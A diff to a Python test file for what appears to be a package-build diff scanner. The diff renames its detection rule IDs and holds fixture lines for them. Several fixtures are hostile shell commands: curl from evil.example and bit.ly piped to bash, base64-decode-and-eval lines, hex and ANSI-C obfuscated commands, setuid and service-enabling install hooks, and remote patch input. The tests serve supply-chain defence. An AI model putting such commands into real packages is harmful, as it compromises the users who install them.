@@ -1,4 +1,4 @@
-"""D-series and R060/R061.
+"""D-series and H015/H016.
 
 Every "must not fire" case here was an observed false positive when the
 D001 fire rate was measured against the 3246-diff benign corpus, so they
@@ -37,7 +37,7 @@ def enabled():
     ensure_default_configs()
     config = copy.deepcopy(load_config())
     config["experimental_rules"] = {
-        r: True for r in ("D001", "D002", "D003", "R060", "R061")
+        r: True for r in ("D001", "D002", "D003", "H015", "H016")
     }
     return config
 
@@ -48,7 +48,7 @@ def disabled():
     config = load_config()
     config["experimental_rules"] = {
         r: False for r in ("D001", "D002", "D003", "D004",
-                           "R061", "R062", "R063", "R064")
+                           "H016", "H017", "H018", "H019")
     }
     return config
 
@@ -170,7 +170,7 @@ def test_unrelated_name_is_not_a_typosquat():
     assert typosquat_target("totally-unrelated-name", KNOWN) is None
 
 
-# --- R061 source-array scoping ---
+# --- H016 source-array scoping ---
 
 def test_source_array_urls_exclude_build_downloads():
     """The whole point of the scoped extractor: a curl URL in build() is
@@ -235,58 +235,58 @@ def test_d003_silent_when_network_tool_already_present(enabled, rules):
     assert "D003" not in fired(diff, enabled, rules)
 
 
-def test_r060_fires_on_build_function_change(enabled, rules):
+def test_h015_fires_on_build_function_change(enabled, rules):
     diff = HEADER + "+build() {\n+  make\n+}\n"
-    assert "R060" in fired(diff, enabled, rules)
+    assert "H015" in fired(diff, enabled, rules)
 
 
-def test_r060_silent_on_metadata_only_change(enabled, rules):
+def test_h015_silent_on_metadata_only_change(enabled, rules):
     diff = HEADER + "-pkgver=1.0\n+pkgver=1.1\n"
-    assert "R060" not in fired(diff, enabled, rules)
+    assert "H015" not in fired(diff, enabled, rules)
 
 
-def test_r061_fires_on_undeclared_download(enabled, rules):
+def test_h016_fires_on_undeclared_download(enabled, rules):
     diff = HEADER + (
         "+source=('https://good.example/a.tar.gz')\n"
         "+build() {\n+  curl https://evil.example/x.sh -o x\n+}\n"
     )
-    assert "R061" in fired(diff, enabled, rules)
+    assert "H016" in fired(diff, enabled, rules)
 
 
-def test_r061_silent_when_url_is_declared(enabled, rules):
+def test_h016_silent_when_url_is_declared(enabled, rules):
     """A legitimate fetch of something already in source=() must not fire."""
     diff = HEADER + (
         "+source=('https://good.example/a.tar.gz')\n"
         "+build() {\n+  curl https://good.example/a.tar.gz -o a\n+}\n"
     )
-    assert "R061" not in fired(diff, enabled, rules)
+    assert "H016" not in fired(diff, enabled, rules)
 
 
-def test_r060_is_info_and_cannot_move_a_score(rules):
+def test_h015_is_info_and_cannot_move_a_score(rules):
     """It fires on 21.4% of benign diffs, so it must contribute nothing."""
     ensure_default_configs()
     config = load_config()
     diff = HEADER + "+build() {\n+  make\n+}\n"
     fact = scan_diff(diff, rules=rules, config=config, package_name="mypkg")
     entries = {e.rule_id: e for e in fact.score_breakdown}
-    assert entries["R060"].severity == "INFO"
-    assert entries["R060"].weight == 0
+    assert entries["H015"].severity == "INFO"
+    assert entries["H015"].weight == 0
     assert fact.final_score == 0
 
 
-def test_r060_defaults_on_for_a_config_without_the_section(rules):
+def test_h015_defaults_on_for_a_config_without_the_section(rules):
     """load_config() never merges defaults into an existing config.toml, so
-    the fallback has to live in code or R060 is dead for every upgrade."""
+    the fallback has to live in code or H015 is dead for every upgrade."""
     diff = HEADER + "+build() {\n+  make\n+}\n"
     fact = scan_diff(diff, rules=rules, config={}, package_name="mypkg")
-    assert "R060" in {e.rule_id for e in fact.score_breakdown}
+    assert "H015" in {e.rule_id for e in fact.score_breakdown}
 
 
 def test_scoring_rules_fire_for_a_config_without_the_section(seeded_db, rules):
-    """With empty config the code fallback enables all D-series and R061."""
+    """With empty config the code fallback enables all D-series and H016."""
     diff = HEADER + "+depends=('glibc' 'totally-unknown-backdoor')\n"
     fact = scan_diff(diff, rules=rules, config={}, package_name="mypkg")
-    assert {"D001", "D002", "D003", "R061"} & {e.rule_id for e in fact.score_breakdown}
+    assert {"D001", "D002", "D003", "H016"} & {e.rule_id for e in fact.score_breakdown}
 
 
 # --- D004: provides/replaces hijack ---
@@ -294,8 +294,8 @@ def test_scoring_rules_fire_for_a_config_without_the_section(seeded_db, rules):
 @pytest.fixture
 def all_enabled(enabled):
     enabled["experimental_rules"].update(
-        {"D004": True, "R062": True, "R063": True, "R064": True,
-         "R081": True, "R082": True}
+        {"D004": True, "H017": True, "H018": True, "H019": True,
+         "H035": True, "H036": True}
     )
     return enabled
 
@@ -324,75 +324,75 @@ def test_d004_silent_for_a_soname(all_enabled, rules):
     assert "D004" not in fired(diff, all_enabled, rules)
 
 
-# --- R062: install hooks run as root ---
+# --- H017: install hooks run as root ---
 
 @pytest.mark.parametrize("body", [
     "chmod u+s /usr/bin/x",
     "systemctl enable --now evil.service",
     "eval \"$payload\"",
 ])
-def test_r062_fires_on_privileged_hook_body(all_enabled, rules, body):
+def test_h017_fires_on_privileged_hook_body(all_enabled, rules, body):
     diff = HEADER + f"+post_install() {{\n+  {body}\n+}}\n"
-    assert "R062" in fired(diff, all_enabled, rules)
+    assert "H017" in fired(diff, all_enabled, rules)
 
 
-def test_r062_silent_when_the_match_is_only_a_comment(all_enabled, rules):
+def test_h017_silent_when_the_match_is_only_a_comment(all_enabled, rules):
     """One of the four corpus hits was `# systemctl enable input-remapper`."""
     diff = HEADER + "+post_install() {\n+  # systemctl enable foo\n+}\n"
-    assert "R062" not in fired(diff, all_enabled, rules)
+    assert "H017" not in fired(diff, all_enabled, rules)
 
 
-def test_r062_silent_on_a_benign_hook(all_enabled, rules):
+def test_h017_silent_on_a_benign_hook(all_enabled, rules):
     diff = HEADER + "+post_install() {\n+  echo 'run foo to configure'\n+}\n"
-    assert "R062" not in fired(diff, all_enabled, rules)
+    assert "H017" not in fired(diff, all_enabled, rules)
 
 
-# --- R063: patch input from outside the build tree ---
+# --- H018: patch input from outside the build tree ---
 
 @pytest.mark.parametrize("cmd", [
     "patch -p1 -i /tmp/x.patch",
     "patch -p1 < <(curl https://evil.example/x.patch)",
 ])
-def test_r063_fires_on_untrusted_patch_input(all_enabled, rules, cmd):
+def test_h018_fires_on_untrusted_patch_input(all_enabled, rules, cmd):
     diff = HEADER + f"+prepare() {{\n+  {cmd}\n+}}\n"
-    assert "R063" in fired(diff, all_enabled, rules)
+    assert "H018" in fired(diff, all_enabled, rules)
 
 
-def test_r063_silent_for_a_patch_from_srcdir(all_enabled, rules):
+def test_h018_silent_for_a_patch_from_srcdir(all_enabled, rules):
     """A patch in $srcdir may have come from the tarball, which is why the
     rule checks where the input comes from rather than whether it is
     declared in source=()."""
     diff = HEADER + '+prepare() {\n+  patch -p1 -i "$srcdir/fix.patch"\n+}\n'
-    assert "R063" not in fired(diff, all_enabled, rules)
+    assert "H018" not in fired(diff, all_enabled, rules)
 
 
-# --- R064: protocol downgrade ---
+# --- H019: protocol downgrade ---
 
-def test_r064_fires_on_https_to_http(all_enabled, rules):
+def test_h019_fires_on_https_to_http(all_enabled, rules):
     diff = HEADER + (
         "-source=('https://e.example/a.tar.gz')\n"
         "+source=('http://e.example/a.tar.gz')\n"
     )
-    assert "R064" in fired(diff, all_enabled, rules)
+    assert "H019" in fired(diff, all_enabled, rules)
 
 
-def test_r064_silent_when_url_was_already_http(all_enabled, rules):
+def test_h019_silent_when_url_was_already_http(all_enabled, rules):
     diff = HEADER + (
         "-source=('http://e.example/a.tar.gz')\n"
         "+source=('http://e.example/b.tar.gz')\n"
     )
-    assert "R064" not in fired(diff, all_enabled, rules)
+    assert "H019" not in fired(diff, all_enabled, rules)
 
 
-def test_r064_silent_on_an_upgrade_to_https(all_enabled, rules):
+def test_h019_silent_on_an_upgrade_to_https(all_enabled, rules):
     diff = HEADER + (
         "-source=('http://e.example/a.tar.gz')\n"
         "+source=('https://e.example/a.tar.gz')\n"
     )
-    assert "R064" not in fired(diff, all_enabled, rules)
+    assert "H019" not in fired(diff, all_enabled, rules)
 
 
-# --- R081: foreign package manager in .install ---
+# --- H035: foreign package manager in .install ---
 
 @pytest.mark.parametrize("body", [
     "pip install evil",
@@ -408,84 +408,84 @@ def test_r064_silent_on_an_upgrade_to_https(all_enabled, rules):
     "apt install evil",
     "make install",
 ])
-def test_r081_fires_on_foreign_pkg_manager_in_hook(all_enabled, rules, body):
+def test_h035_fires_on_foreign_pkg_manager_in_hook(all_enabled, rules, body):
     diff = HEADER + f"+post_install() {{\n+  {body}\n+}}\n"
-    assert "R081" in fired(diff, all_enabled, rules)
+    assert "H035" in fired(diff, all_enabled, rules)
 
 
-def test_r081_silent_in_build_function(all_enabled, rules):
+def test_h035_silent_in_build_function(all_enabled, rules):
     """Same command in build() is not an install concern."""
     diff = HEADER + "+build() {\n+  pip install evil\n+}\n"
-    assert "R081" not in fired(diff, all_enabled, rules)
+    assert "H035" not in fired(diff, all_enabled, rules)
 
 
-def test_r081_silent_on_make_install_with_destdir(all_enabled, rules):
+def test_h035_silent_on_make_install_with_destdir(all_enabled, rules):
     """make install with DESTDIR is a normal packaging step."""
     diff = HEADER + "+post_install() {\n+  make install DESTDIR=/tmp/pkg\n+}\n"
-    assert "R081" not in fired(diff, all_enabled, rules)
+    assert "H035" not in fired(diff, all_enabled, rules)
 
 
-def test_r081_silent_on_benign_hook(all_enabled, rules):
+def test_h035_silent_on_benign_hook(all_enabled, rules):
     diff = HEADER + "+post_install() {\n+  echo nothing\n+}\n"
-    assert "R081" not in fired(diff, all_enabled, rules)
+    assert "H035" not in fired(diff, all_enabled, rules)
 
 
-def test_r081_silent_inside_a_comment(all_enabled, rules):
+def test_h035_silent_inside_a_comment(all_enabled, rules):
     diff = HEADER + "+post_install() {\n+  # pip install foo\n+}\n"
-    assert "R081" not in fired(diff, all_enabled, rules)
+    assert "H035" not in fired(diff, all_enabled, rules)
 
 
-# --- R082: shell obfuscation density ---
+# --- H036: shell obfuscation density ---
 
-def test_r082_fires_on_dense_obfuscation(all_enabled, rules):
+def test_h036_fires_on_dense_obfuscation(all_enabled, rules):
     """Line with >=3 obfuscation indicators -> fires."""
     diff = HEADER + '+build() {\n+  eval $(base64 -d <<< "$x" | bash)\n+}\n'
-    assert "R082" in fired(diff, all_enabled, rules)
+    assert "H036" in fired(diff, all_enabled, rules)
 
 
-def test_r082_silent_with_one_indicator(all_enabled, rules):
+def test_h036_silent_with_one_indicator(all_enabled, rules):
     """Single obfuscation pattern -> no fire."""
     diff = HEADER + '+build() {\n+  eval "$cmd"\n+}\n'
-    assert "R082" not in fired(diff, all_enabled, rules)
+    assert "H036" not in fired(diff, all_enabled, rules)
 
 
-def test_r082_silent_with_two_indicators(all_enabled, rules):
+def test_h036_silent_with_two_indicators(all_enabled, rules):
     """Two patterns is below the threshold of 3."""
     diff = HEADER + '+build() {\n+  eval `echo $x`\n+}\n'
-    assert "R082" not in fired(diff, all_enabled, rules)
+    assert "H036" not in fired(diff, all_enabled, rules)
 
 
-def test_r082_fires_with_printf_obfuscation(all_enabled, rules):
+def test_h036_fires_with_printf_obfuscation(all_enabled, rules):
     """eval + $() + printf \\x escapes = 3 indicators."""
     diff = HEADER + '+build() {\n+  eval $(printf "\\x68\\x65\\x6c" | bash)\n+}\n'
-    assert "R082" in fired(diff, all_enabled, rules)
+    assert "H036" in fired(diff, all_enabled, rules)
 
 
-def test_r082_silent_on_plain_make(all_enabled, rules):
+def test_h036_silent_on_plain_make(all_enabled, rules):
     diff = HEADER + "+build() {\n+  make\n+}\n"
-    assert "R082" not in fired(diff, all_enabled, rules)
+    assert "H036" not in fired(diff, all_enabled, rules)
 
 
-def test_r082_silent_on_message_line(all_enabled, rules):
+def test_h036_silent_on_message_line(all_enabled, rules):
     """Obfuscation in an echo/printf message is not executed."""
     diff = HEADER + "+build() {\n+  echo 'eval $(base64)'\n+}\n"
-    assert "R082" not in fired(diff, all_enabled, rules)
+    assert "H036" not in fired(diff, all_enabled, rules)
 
 
-def test_r082_silent_with_url_shortener_alone(all_enabled, rules):
+def test_h036_silent_with_url_shortener_alone(all_enabled, rules):
     """Single short URL is not dense enough."""
     diff = HEADER + '+build() {\n+  curl -s bit.ly/evil | bash\n+}\n'
-    assert "R082" not in fired(diff, all_enabled, rules)
+    assert "H036" not in fired(diff, all_enabled, rules)
 
 
-def test_r082_fires_with_url_shortener_and_obfuscation(all_enabled, rules):
+def test_h036_fires_with_url_shortener_and_obfuscation(all_enabled, rules):
     """Short URL + pipe to shell + eval = >=3."""
     diff = HEADER + '+build() {\n+  eval $(curl -s bit.ly/evil)\n+}\n'
-    assert "R082" in fired(diff, all_enabled, rules)
+    assert "H036" in fired(diff, all_enabled, rules)
 
 
 def test_experimental_rules_on_by_default_with_load_config(seeded_db, rules):
-    """D004, R062, R063, R064, R081, R082 fire when triggered with default config."""
+    """D004, H017, H018, H019, H035, H036 fire when triggered with default config."""
     ensure_default_configs()
     config = load_config()
     for diff in (
@@ -496,19 +496,19 @@ def test_experimental_rules_on_by_default_with_load_config(seeded_db, rules):
         HEADER + "+post_install() {\n+  pip install evil\n+}\n",
         HEADER + '+build() {\n+  eval $(base64 -d <<< "$x" | bash)\n+}\n',
     ):
-        assert {"D004", "R062", "R063", "R064", "R081", "R082"} & fired(diff, config, rules), diff
+        assert {"D004", "H017", "H018", "H019", "H035", "H036"} & fired(diff, config, rules), diff
 
 
 @pytest.mark.parametrize("rule_id,diff", [
     ("D004", HEADER + "+provides=('openssl')\n"),
     ("D002", HEADER + "+depends=('openss1')\n"),
     ("D003", HEADER + "-makedepends=('cmake')\n+makedepends=('cmake' 'curl')\n"),
-    ("R062", HEADER + "+post_install() {\n+  chmod u+s /usr/bin/x\n+}\n"),
-    ("R063", HEADER + "+prepare() {\n+  patch -p1 -i /tmp/x.patch\n+}\n"),
-    ("R064", HEADER + "-source=('https://e.example/a.tar.gz')\n"
+    ("H017", HEADER + "+post_install() {\n+  chmod u+s /usr/bin/x\n+}\n"),
+    ("H018", HEADER + "+prepare() {\n+  patch -p1 -i /tmp/x.patch\n+}\n"),
+    ("H019", HEADER + "-source=('https://e.example/a.tar.gz')\n"
                       "+source=('http://e.example/a.tar.gz')\n"),
-    ("R081", HEADER + "+post_install() {\n+  pip install evil\n+}\n"),
-    ("R082", HEADER + '+build() {\n+  eval $(base64 -d <<< "$x" | bash)\n+}\n'),
+    ("H035", HEADER + "+post_install() {\n+  pip install evil\n+}\n"),
+    ("H036", HEADER + '+build() {\n+  eval $(base64 -d <<< "$x" | bash)\n+}\n'),
 ])
 def test_each_rule_works_when_enabled_alone(seeded_db, rules, rule_id, diff):
     """D004 shared a guard clause that only tested D001-D003, so enabling it
@@ -543,7 +543,7 @@ def test_d004_still_fires_across_an_ecosystem_prefix(rules, pkg, provided):
     assert not is_related_package(provided, pkg)
 
 
-# --- R117: obfuscated reconstruction + composition (June-W3 campaign) ---
+# --- H065: obfuscated reconstruction + composition (June-W3 campaign) ---
 
 @pytest.mark.parametrize("body", [
     # June-W3: foreign package manager hidden behind ANSI-C quoting.
@@ -553,11 +553,11 @@ def test_d004_still_fires_across_an_ecosystem_prefix(rules, pkg, provided):
     r"b''u''n add nextfile-js",
     r"$(printf '\x62\x75\x6e') add nextfile-js",
 ])
-def test_r081_fires_on_reconstructed_foreign_pm_in_hook(all_enabled, rules, body):
-    """R081 is position-scoped to install hooks and must fire on the
+def test_h035_fires_on_reconstructed_foreign_pm_in_hook(all_enabled, rules, body):
+    """H035 is position-scoped to install hooks and must fire on the
     *reconstructed* shape: the literal bytes never appear in the diff."""
     diff = HEADER + f"+post_install() {{\n+  {body}\n+}}\n"
-    assert "R081" in fired(diff, all_enabled, rules)
+    assert "H035" in fired(diff, all_enabled, rules)
 
 
 def _ansi(word):
@@ -565,28 +565,28 @@ def _ansi(word):
     return "$'" + "".join("\\x%02x" % b for b in word.encode()) + "'"
 
 
-def test_r081_silent_on_reconstructed_foreign_pm_in_build(all_enabled, rules):
+def test_h035_silent_on_reconstructed_foreign_pm_in_build(all_enabled, rules):
     """Same reconstruction in build() is not an install concern."""
     diff = HEADER + "+build() {\n" + f"+  {_ansi('bun')} add nextfile-js" + "\n}\n"
-    assert "R081" not in fired(diff, all_enabled, rules)
+    assert "H035" not in fired(diff, all_enabled, rules)
 
 
-def test_r082_composes_high_when_reconstruction_reveals_action(all_enabled, rules):
-    """R082 is MEDIUM alone; R082 + reconstruction to an executable action
+def test_h036_composes_high_when_reconstruction_reveals_action(all_enabled, rules):
+    """H036 is MEDIUM alone; H036 + reconstruction to an executable action
     (decode-and-pipe) is HIGH."""
     line = f"{_ansi('eval')} $({_ansi('base64')} -d <<< \"$x\" | bash)"
     diff = HEADER + "+build() {\n" + f"+  {line}" + "\n}\n"
     facts = scan_diff(diff, rules=rules, config=all_enabled, package_name="mypkg")
-    r082 = [e for e in facts.score_breakdown if e.rule_id == "R082"]
-    assert r082 and r082[0].severity == "HIGH"
+    h036 = [e for e in facts.score_breakdown if e.rule_id == "H036"]
+    assert h036 and h036[0].severity == "HIGH"
 
 
-def test_r082_remains_medium_when_reconstruction_is_inert(all_enabled, rules):
+def test_h036_remains_medium_when_reconstruction_is_inert(all_enabled, rules):
     """Dense obfuscation that reconstructs to nothing executable stays
     MEDIUM, not HIGH."""
     line = f"{_ansi('echo')} hi \"$(printf '\\x62\\x61\\x73\\x65\\x36\\x34' -d <<< 'aGk=')\""
     diff = HEADER + "+build() {\n" + f"+  {line}" + "\n}\n"
     facts = scan_diff(diff, rules=rules, config=all_enabled, package_name="mypkg")
-    r082 = [e for e in facts.score_breakdown if e.rule_id == "R082"]
-    assert r082 and r082[0].severity == "MEDIUM"
+    h036 = [e for e in facts.score_breakdown if e.rule_id == "H036"]
+    assert h036 and h036[0].severity == "MEDIUM"
 
